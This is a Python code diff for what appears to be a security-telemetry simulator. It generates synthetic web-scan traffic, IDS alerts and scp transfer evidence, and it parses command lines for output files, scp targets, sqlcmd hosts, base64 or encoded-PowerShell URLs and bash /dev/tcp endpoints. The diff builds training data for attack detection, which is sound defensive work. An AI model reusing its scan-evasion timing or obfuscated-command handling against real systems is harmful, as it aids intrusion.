+        ip_map = getattr(self.activity_generator, "_ip_to_system", {})
+        if scan_src_ip in ip_map:
+            src_sys = ip_map[scan_src_ip]
+        elif scan_src_ip == system.ip:
+            src_sys = system
+        story_pid, _story_image = self._last_storyline_process_for_system(src_sys)
+
+        is_tls = spec.dst_port == 443
+        ids_ua_def = preset_data.get("ids_ua") if preset_data else None
+        ids_rate_def = preset_data.get("ids_rate") if preset_data else None
+        rate_threshold = ids_rate_def.get("threshold", 20) if ids_rate_def else 20
+        effective_rate = spec.rate
+        if count is None and preset_data:
+            max_effective_rate = preset_data.get("max_effective_rate")
+            if max_effective_rate is not None:
+                rate_cap = parse_positive_finite_rate(max_effective_rate)
+                if rate_cap is None:
+                    logger.warning(
+                        "Ignoring invalid web_scan max_effective_rate for preset %s: %r",
+                        spec.preset,
+                        max_effective_rate,
+                    )
+                else:
+                    effective_rate = min(effective_rate, rate_cap)
+        interval_sec = _effective_rate_interval(effective_rate, count, rng)
+        ua_fired = False
+        last_rate_alert_ts = None
+        next_rate_alert_delay = rng.uniform(45.0, 95.0)
+        send_referrer_config = preset_data.get("send_referrer") if preset_data else None
+
+        request_count = 0
+        path_sequence: list[dict[str, Any]] = []
+
+        def _next_scan_path() -> dict[str, Any]:
+            nonlocal path_sequence
+            if not path_sequence:
+                path_sequence = list(scan_paths)
+                rng.shuffle(path_sequence)
+                if len(path_sequence) > 8:
+                    skip_count = rng.randint(0, max(1, len(path_sequence) // 10))
+                    for _ in range(skip_count):
+                        if len(path_sequence) <= 4:
+                            break
+                        del path_sequence[rng.randrange(len(path_sequence))]
+            return path_sequence.pop()
+
+        pause_until: datetime | None = None
+        for tick_time in periodic_helpers._iter_periodic_ticks(
+            start,
+            interval_sec,
+            duration_sec,
+            count,
+            spec.jitter,
+            rng,
+            exclusive_end_time=getattr(self, "end_time", None),
+        ):
+            if pause_until is not None and tick_time < pause_until:
+                continue
+            if request_count > 0 and rng.random() < 0.025:
+                continue
+            if request_count > 0 and rng.random() < 0.008:
+                pause_until = tick_time + timedelta(seconds=rng.uniform(3.0, 45.0))
+                continue
+
+            self.state_manager.set_current_time(tick_time)
+            path_entry = _next_scan_path()
+
+            method = str(path_entry.get("method", "GET")).upper()
+            uri = _web_scan_uri_with_runtime_variation(
+                str(path_entry.get("uri", "/")),
+                request_count,
+                random.Random(
+                    _stable_seed(
+                        "web_scan_uri_variation:"
+                        f"{scan_src_ip}:{scan_dst_ip}:{request_count}:"
+                        f"{tick_time.isoformat()}"
+                    )
+                ),
+            )
+            status = _observed_web_scan_status(
+                path_entry,
+                random.Random(
+                    _stable_seed(
+                        "web_scan_status:"
+                        f"{scan_src_ip}:{scan_dst_ip}:{uri}:{request_count}:"
+                        f"{tick_time.isoformat()}"
+                    )
+                ),
+            )
+
+            mime_type = normalize_mime_type_for_path(uri, "text/html")
+            scan_referrer = (
+                pick_scan_referrer(rng, scan_host, send_referrer_config, port=spec.dst_port)
+                if _web_scan_path_allows_referrer(path_entry)
+                else ""
+            )
+
+            if method == "HEAD":
+                response_body_len = 0
+            else:
+                response_body_len = (
+                    apply_transfer_size_variance(
+                        response_size_for_status(status, scan_host, uri),
+                        status_code=status,
+                        host=scan_host,
+                        uri=uri,
+                        content_type=mime_type,
+                        variant_key=f"{scan_src_ip}:{scan_ua}",
+                    )
+                    if status >= 400 or is_stable_resource_path(uri)
+                    else response_size_for_mime(rng, mime_type)
+                )
+            http_ctx = HttpContext(
+                method=method,
+                host=scan_host,
+                uri=uri,
+                version="1.1",
+                user_agent=render_ua(scan_ua, rng),
+                request_body_len=rng.randint(100, 500) if method == "POST" else 0,
+                response_body_len=response_body_len,
+                status_code=status,
+                status_msg={
+                    200: "OK",
+                    301: "Moved Permanently",
+                    302: "Found",
+                    403: "Forbidden",
+                    404: "Not Found",
+                    405: "Method Not Allowed",
+                    500: "Internal Server Error",
+                }.get(status, "OK"),
+                referrer=scan_referrer,
+                resp_mime_types=[mime_type] if status == 200 and method != "HEAD" else [],
+                tags=[],
+            )
+
+            ids_ctx = None
+            if not is_tls and ids_ua_def and not ua_fired:
+                ids_ctx = IdsAlertActionBundle(
+                    IdsAlertRequest(
+                        signature=ids_ua_def,
+                        time=tick_time,
+                        src_ip=scan_src_ip,
+                        dst_ip=scan_dst_ip,
+                        dst_port=spec.dst_port,
+                        proto="tcp",
+                        rng=rng,
+                        source="web_scan",
+                        direction="in",
+                        predicate=SignaturePredicate(
+                            transport_protocol="tcp",
+                            destination_port=spec.dst_port,
+                            phase="application",
+                            payload_direction="orig",
+                            minimum_payload_bytes=1,
+                            application_protocol="http",
+                            inspection="payload_cleartext",
+                            semantic_claim="request_content",
+                        ),
+                    )
+                ).execute()
+                ua_fired = True
+            elif not is_tls and isinstance(path_entry.get("ids"), dict):
+                path_ids = path_entry["ids"]
+                ids_ctx = IdsAlertActionBundle(
+                    IdsAlertRequest(
+                        signature=path_ids,
+                        time=tick_time,
+                        src_ip=scan_src_ip,
+                        dst_ip=scan_dst_ip,
+                        dst_port=spec.dst_port,
+                        proto="tcp",
+                        rng=rng,
+                        source="web_scan",
+                        direction="in",
+                        predicate=SignaturePredicate(
+                            transport_protocol="tcp",
+                            destination_port=spec.dst_port,
+                            phase="application",
+                            payload_direction="orig",
+                            minimum_payload_bytes=1,
+                            application_protocol="http",
+                            inspection="payload_cleartext",
+                            http_methods=(method,),
+                            semantic_claim="request_content",
+                        ),
+                    )
+                ).execute()
+
+            if ids_ctx is None and ids_rate_def and request_count >= rate_threshold:
+                fire_rate = False
+                if last_rate_alert_ts is None:
+                    fire_rate = True
+                elif (tick_time - last_rate_alert_ts).total_seconds() >= next_rate_alert_delay:
+                    fire_rate = True
+                if fire_rate:
+                    ids_ctx = IdsAlertActionBundle(
+                        IdsAlertRequest(
+                            signature=ids_rate_def,
+                            time=tick_time,
+                            src_ip=scan_src_ip,
+                            dst_ip=scan_dst_ip,
+                            dst_port=spec.dst_port,
+                            proto="tcp",
+                            rng=rng,
+                            source="web_scan",
+                            direction="in",
+                        )
+                    ).execute()
+                    last_rate_alert_ts = tick_time
+                    next_rate_alert_delay = rng.uniform(45.0, 120.0)
+
+            conn_state, duration, orig_bytes, resp_bytes = _web_scan_connection_profile(
+                rng, is_tls=is_tls
+            )
+            http_for_conn = http_ctx if conn_state == "SF" else None
+            authored_ids_alerts = ids_helpers._build_ids_alert_contexts(
+                getattr(spec, "ids_alerts", []),
+                time=tick_time,
+                src_ip=scan_src_ip,
+                dst_ip=scan_dst_ip,
+                dst_port=spec.dst_port,
+                proto="tcp",
+                rng=rng,
+                source="storyline_web_scan",
+            )
+
+            self.activity_generator.generate_connection(
+                src_ip=scan_src_ip,
+                dst_ip=scan_dst_ip,
+                time=tick_time,
+                dst_port=spec.dst_port,
+                service=service,
+                duration=duration,
+                orig_bytes=orig_bytes,
+                resp_bytes=resp_bytes,
+                conn_state=conn_state,
+                emit_dns=request_count == 0,
+                source_system=src_sys,
+                http=http_for_conn,
+                hostname=scan_host if spec.hostname else None,
+                pid=story_pid,
+                ids_alerts=[
+                    *([ids_ctx] if ids_ctx is not None else []),
+                    *authored_ids_alerts,
+                ],
+            )
+            request_count += 1
+
+        malicious_event["dst_ip"] = spec.dst_ip
+        malicious_event["dst_port"] = spec.dst_port
+        malicious_event["preset"] = spec.preset
+        malicious_event["request_count"] = request_count
+        if getattr(spec, "ids_alerts", []):
+            malicious_event["ids_alerts"] = ids_helpers._ids_attachment_ground_truth(
+                spec.ids_alerts
+            )
+        return malicious_event
+
+    def _resolve_firewall_interface(self, ip: str) -> str:
+        """Resolve an IP to a firewall interface name using scenario network config."""
+        import ipaddress as _ipaddress
+
+        if not self.scenario.environment.network:
+            return "outside"
+        fw_sensor = next(
+            (s for s in self.scenario.environment.network.sensors if s.type == "firewall"),
+            None,
+        )
+        interfaces = fw_sensor.interfaces if fw_sensor else {}
+        for seg in self.scenario.environment.network.segments:
+            try:
+                if _ipaddress.ip_address(ip) in _ipaddress.ip_network(seg.cidr, strict=False):
+                    return interfaces.get(seg.name, seg.name)
+            except (ValueError, KeyError):
+                continue
+        return interfaces.get("_default", "outside")
+
+    def _get_firewall_deny_conn_state(self) -> str:
+        """Get the conn_state for denied connections based on firewall drop_mode."""
+        if not self.scenario.environment.network:
+            return "S0"
+        fw_sensor = next(
+            (s for s in self.scenario.environment.network.sensors if s.type == "firewall"),
+            None,
+        )
+        if fw_sensor and fw_sensor.drop_mode == "reject":
+            return "REJ"
+        return "S0"
+
+    @staticmethod
+    def _extract_output_file(command_line: str, os_category: str) -> str | None:
+        """Extract output file path from a command line string.
+
+        Detects common output file patterns in PowerShell, cmd, and Linux commands.
+        Returns the file path if found, None otherwise.
+        """
+        try:
+            parts = shlex.split(command_line, posix=os_category != "windows")
+        except ValueError:
+            parts = command_line.split()
+        command_name = parts[0].rsplit("\\", 1)[-1].rsplit("/", 1)[-1].lower() if parts else ""
+
+        patterns = [
+            r'Export-Csv\s+[\'"]?([^\s\'">;]+)',  # PowerShell Export-Csv
+            r'-OutFile\s+[\'"]?([^\s\'">;]+)',  # PowerShell -OutFile
+            r'Out-File\s+[\'"]?([^\s\'">;]+)',  # PowerShell Out-File
+            r'>\s*[\'"]?([^\s\'">;]+)',  # Shell redirect >
+            r'--output[= ]\s*[\'"]?([^\s\'">;]+)',  # --output flag
+        ]
+        short_o_output_tools = {
+            "curl",
+            "wget",
+            "nmap",
+            "tar",
+            "zip",
+            "7z",
+            "mysql",
+            "mysqldump",
+            "psql",
+            "sqlcmd",
+        }
+        if command_name in short_o_output_tools:
+            patterns.append(r'-o\s+[\'"]?([^\s\'">;]+)')  # Tool-specific output flag
+        for pattern in patterns:
+            match = re.search(pattern, command_line, re.IGNORECASE)
+            if match:
+                return match.group(1)
+        return None
+
+    @staticmethod
+    def _extract_scp_destination(
+        command_line: str, os_category: str
+    ) -> tuple[str, str, str] | None:
+        """Extract remote host, path, and username from a Linux scp command line."""
+        if os_category != "linux":
+            return None
+        try:
+            parts = shlex.split(command_line)
+        except ValueError:
+            parts = command_line.split()
+        if not parts:
+            return None
+        exe = parts[0].rsplit("/", 1)[-1].lower()
+        if exe != "scp":
+            return None
+        for token in parts[1:]:
+            if token.startswith("-") or ":" not in token:
+                continue
+            remote, path = token.split(":", 1)
+            if not remote:
+                continue
+            user = ""
+            if "@" in remote:
+                user, host = remote.rsplit("@", 1)
+            else:
+                host = remote
+            host = host.strip("[]")
+            if host and path:
+                return host, path, user
+        return None
+
+    @staticmethod
+    def _extract_scp_source_path(command_line: str, os_category: str) -> str | None:
+        """Extract the first local source path from a Linux SCP upload command line."""
+        if os_category != "linux":
+            return None
+        try:
+            parts = shlex.split(command_line)
+        except ValueError:
+            parts = command_line.split()
+        if not parts:
+            return None
+        exe = parts[0].rsplit("/", 1)[-1].lower()
+        if exe != "scp":
+            return None
+        option_args = {"-B", "-c", "-F", "-i", "-J", "-l", "-o", "-P", "-S"}
+        skip_next = False
+        for token in parts[1:]:
+            if skip_next:
+                skip_next = False
+                continue
+            if token == "--":
+                continue
+            if token in option_args:
+                skip_next = True
+                continue
+            if token.startswith("-"):
+                continue
+            if ":" in token:
+                return None
+            return token
+        return None
+
+    @staticmethod
+    def _resolve_scp_target_user(extracted_username: str, fallback_username: str) -> str:
+        """Resolve SCP target user to a scenario-compatible username."""
+        username = extracted_username.strip()
+        if username and re.fullmatch(r"[a-zA-Z0-9._$-]+", username):
+            return username
+        return fallback_username
+
+    @staticmethod
+    def _extract_scp_target(command_line: str, os_category: str) -> str | None:
+        """Extract the remote host from a Linux scp command line."""
+        destination = StorylineMixin._extract_scp_destination(command_line, os_category)
+        return destination[0] if destination is not None else None
+
+    @staticmethod
+    def _extract_database_client_target(
+        command_line: str, os_category: str
+    ) -> tuple[str, int, str] | None:
+        """Extract remote database endpoint details from a storyline command."""
+        if os_category != "windows":
+            return None
+        if not re.search(r"\bsqlcmd(?:\.exe)?\b", command_line, re.IGNORECASE):
+            return None
+
+        match = re.search(
+            r'(?i)\bsqlcmd(?:\.exe)?\b.*?(?:^|\s)-S\s*(?:"([^"]+)"|(\S+))',
+            command_line,
+        )
+        if match is None:
+            match = re.search(
+                r'(?i)\bsqlcmd(?:\.exe)?\b.*?(?:^|\s)-S(?:"([^"]+)"|(\S+))',
+                command_line,
+            )
+        if match is None:
+            return None
+
+        raw_target = (match.group(1) or match.group(2) or "").strip().strip("'\"")
+        if not raw_target:
+            return None
+        target = raw_target
+        if target.lower().startswith("tcp:"):
+            target = target[4:]
+        port = 1433
+        if "," in target:
+            target, port_text = target.rsplit(",", 1)
+            try:
+                parsed_port = int(port_text)
+            except ValueError:
+                parsed_port = 1433
+            if 0 < parsed_port <= 65535:
+                port = parsed_port
+        if "\\" in target:
+            target = target.split("\\", 1)[0]
+        target = target.strip().strip("[]")
+        if target.lower() in {"", ".", "(local)", "localhost", "127.0.0.1", "::1"}:
+            return None
+        return target, port, "tds"
+
+    @staticmethod
+    def _is_local_database_instance_target(target: str) -> bool:
+        """Return true for SQL Server local-instance shorthands."""
+        lowered = target.strip().strip("[]").lower()
+        return lowered in {
+            "sqlexpress",
+            "mssqllocaldb",
+            "(localdb)",
+            ".\\sqlexpress",
+            ".\\mssqllocaldb",
+        } or lowered.startswith("(localdb)\\")
+
+    @staticmethod
+    def _unresolved_database_target_ip(target: str) -> str:
+        """Return a deterministic unrouted internal IP for unresolved DB hosts."""
+        last_octet = 10 + (_stable_seed(f"storyline_db_target:{target.lower()}") % 220)
+        return f"10.0.2.{last_octet}"
+
+    def _system_for_ip(self, ip: str) -> System | None:
+        """Return the scenario system with the given IP."""
+        for system in self.scenario.environment.systems:
+            if system.ip == ip:
+                return system
+        return None
+
+    def _emit_scp_receiver_artifacts(
+        self,
+        *,
+        source_system: System,
+        target_system: System,
+        actor: User,
+        source_pid: int,
+        source_process: str,
+        source_command: str,
+        source_path: str,
+        target_user: str,
+        target_path: str,
+        transfer_time: datetime,
+        source_port: int,
+        transfer_completed_at: datetime | None = None,
+        source_content: FileContentIdentity | None = None,
+        rng: random.Random,
+    ) -> datetime | None:
+        """Emit target-side file evidence after the SSH bundle models the transfer session."""
+        bundle = ScpReceiverFileActionBundle(
+            self,
+            ScpReceiverFileRequest(
+                source_system=source_system,
+                target_system=target_system,
+                actor=actor,
+                source_pid=source_pid,
+                source_process=source_process,
+                source_command=source_command,
+                source_path=source_path,
+                target_user=target_user,
+                target_path=target_path,
+                transfer_time=transfer_time,
+                source_port=source_port,
+                transfer_completed_at=transfer_completed_at,
+                source_content=source_content,
+            ),
+            rng,
+        )
+        plan = bundle.plan_execution()
+        if plan is None or not bundle.execute():
+            return None
+        available_at = max(
+            plan.receiver_create.timestamp,
+            ensure_utc(transfer_completed_at)
+            if transfer_completed_at is not None
+            else plan.receiver_create.timestamp,
+        )
+        self._remember_storyline_file_available(
+            system=target_system,
+            path=target_path,
+            available_at=available_at,
+            source_file=bundle.receiver_source_file,
+        )
+        return available_at
+
+    @staticmethod
+    def _extract_http_url(command_line: str) -> str | None:
+        """Extract the first HTTP(S) URL from a storyline process command line."""
+        for candidate in StorylineMixin._http_url_search_texts(command_line):
+            match = re.search(r"https?://[^\s'\"),;]+", candidate, re.IGNORECASE)
+            if match:
+                return match.group(0).rstrip(".")
+        return None
+
+    @staticmethod
+    def _http_url_search_texts(command_line: str) -> list[str]:
+        """Return raw and decoded command strings to scan for embedded URLs."""
+        texts = [command_line]
+        shell_b64_match = re.search(
+            r"(?i)(?:echo|printf)\s+['\"]?([A-Za-z0-9+/=]{16,})['\"]?\s*\|\s*base64\s+-d",
+            command_line,
+        )
+        if shell_b64_match:
+            token = shell_b64_match.group(1)
+            if len(token) <= _MAX_EMBEDDED_COMMAND_B64_CHARS:
+                try:
+                    decoded = base64.b64decode(token, validate=True).decode("utf-8")
+                except (binascii.Error, UnicodeDecodeError, ValueError):
+                    decoded = ""
+                if decoded and decoded not in texts:
+                    texts.append(decoded)
+        encoded_match = re.search(
+            r"(?i)(?:-|/)(?:encodedcommand|enc|e)\s+([A-Za-z0-9+/=]+)",
+            command_line,
+        )
+        if not encoded_match:
+            return texts
+
+        token = encoded_match.group(1)
+        if len(token) > _MAX_EMBEDDED_COMMAND_B64_CHARS:
+            return texts
+
+        try:
+            decoded_bytes = base64.b64decode(token, validate=True)
+        except (binascii.Error, ValueError):
+            return texts
+
+        for encoding in ("utf-16le", "utf-8"):
+            try:
+                decoded = decoded_bytes.decode(encoding).strip("\ufeff\x00 \t\r\n")
+            except UnicodeDecodeError:
+                continue
+            if decoded and decoded not in texts:
+                texts.append(decoded)
+        return texts
+
+    @staticmethod
+    def _command_contains_raw_tcp_endpoint(command_line: str, dst_ip: str, dst_port: int) -> bool:
+        """Return true when a command uses bash /dev/tcp for this endpoint."""
+        endpoint = f"/dev/tcp/{dst_ip}/{dst_port}"
+        return any(endpoint in text for text in StorylineMixin._http_url_search_texts(command_line))
+
+    @staticmethod
+    def _parse_http_url_target(http_url: str) -> tuple[str, int] | None:
+        """Parse a storyline command URL into a safe hostname and destination port."""
+        from urllib.parse import urlparse
+
+        try:
+            parsed_url = urlparse(http_url)
+            hostname = parsed_url.hostname
+            port = parsed_url.port
+        except ValueError:
+            logger.debug("Ignoring malformed HTTP URL from storyline command: %s", http_url)
+            return None
+
+        if not hostname:
+            return None
+
+        return hostname, port or (443 if parsed_url.scheme.lower() == "https" else 80)
+
+    def _resolve_storyline_network_target(self, target: str) -> str | None:
+        """Resolve a storyline command target host/IP to an environment IP when possible."""
+        lowered = target.rstrip(".").lower()
+        if process_helpers._IPV4_LITERAL_RE.fullmatch(lowered):
+            return target
+        ad_domain = getattr(self, "_ad_domain", "")
+        for system in self.scenario.environment.systems:
+            candidates = {
+                system.hostname.lower(),
+                system.ip,
+            }
+            if ad_domain:
+                candidates.add(f"{system.hostname}.{ad_domain}".lower())
+            if lowered in candidates:
+                return system.ip
+        return None
+
+    def _storyline_authored_ip_for_hostname(self, hostname: str) -> str | None:
+        """Return an explicit storyline IP for an external hostname when one exists."""
+        lowered = hostname.rstrip(".").lower()
+        return self._storyline_authored_ip_index().get(lowered)
+
+    def _storyline_authored_ip_index(self) -> dict[str, str]:
+        """Build a cached hostname-to-authored-IP index from storyline specs."""
+        cached = getattr(self, "_storyline_authored_ip_by_hostname", None)
+        if cached is not None:
+            return cached
+
+        authored_ips: dict[str, str] = {}
+        for story_event in getattr(self.scenario, "storyline", []):
+            for spec in getattr(story_event, "events", []):
+                event_hostname = self._storyline_spec_value(spec, "hostname")
+                dst_ip = self._storyline_spec_value(spec, "dst_ip")
+                self._record_storyline_authored_ip(
+                    authored_ips,
+                    hostname=event_hostname,
+                    ip=dst_ip,
+                )
+
+                query = self._storyline_spec_value(spec, "query")
+                answer = self._storyline_spec_value(spec, "answer")
+                self._record_storyline_authored_ip(
+                    authored_ips,
+                    hostname=query,
+                    ip=answer,
+                )
+
+        self._storyline_authored_ip_by_hostname = authored_ips
+        return authored_ips
+
+    @staticmethod
+    def _record_storyline_authored_ip(
+        authored_ips: dict[str, str],
+        *,
+        hostname: Any,
+        ip: Any,
+    ) -> None:
+        """Record the first valid authored IP for a normalized storyline hostname."""
+        if (
+            not hostname
+            or not isinstance(ip, str)
+            or not process_helpers._IPV4_LITERAL_RE.fullmatch(ip)
+        ):
+            return
+        lowered = str(hostname).rstrip(".").lower()
+        authored_ips.setdefault(lowered, ip)
+
+    @staticmethod
+    def _storyline_spec_value(spec: Any, field_name: str) -> Any:
+        """Read a typed or raw storyline event field."""
+        if isinstance(spec, dict):
+            return spec.get(field_name)
+        return getattr(spec, field_name, None)
+
+    def _parse_storyline_time(self, time_str: str) -> datetime:
+        """Parse storyline event time to absolute datetime.
+
+        Supports:
+        - ISO 8601 absolute time: "2024-01-15T10:30:00Z"
+        - Relative offset (duration): "+2h30m"
+        - Relative offset (seconds): "+7200"
+
+        Args:
+            time_str: Time string to parse
+
+        Returns:
+            Absolute datetime (UTC)
+
+        Raises:
+            ValueError: If time format is invalid
+        """
+        if time_str[0].isdigit() and len(time_str) > 10:
+            return parse_iso8601(time_str)
+
+        if time_str.startswith("+"):
+            offset_str = time_str[1:]
+            if offset_str.isdigit():
+                offset = timedelta(seconds=int(offset_str))
+            else:
+                offset = parse_duration(offset_str)
+            return self.start_time + offset
+
+        raise ValueError(f"Invalid storyline time format: {time_str}")
+
+    def _make_domain_sid(self, rid: int | None = None) -> str:
+        """Generate a SID using the scenario's domain SID prefix."""
+        rng = _get_rng()
+        for sid in self.activity_generator.sid_registry.values():
+            if sid.startswith("S-1-5-21-") and sid.count("-") == 7:
+                prefix = "-".join(sid.split("-")[:7])
+                return f"{prefix}-{rid or rng.randint(1100, 9999)}"
+        return f"S-1-5-21-{rng.randint(100000000, 999999999)}-{rng.randint(100000000, 999999999)}-{rng.randint(100000000, 999999999)}-{rid or rng.randint(1100, 9999)}"
+
+    def _generate_encoded_powershell(self, seed: int) -> str:
+        """Generate a realistic base64-encoded PowerShell command.
+
+        PowerShell -enc expects UTF-16LE encoded base64.
+        """
+        rng = _get_rng()
+        cmd = rng.choice(POWERSHELL_COMMANDS)
+        return base64.b64encode(cmd.encode("utf-16-le")).decode("ascii")
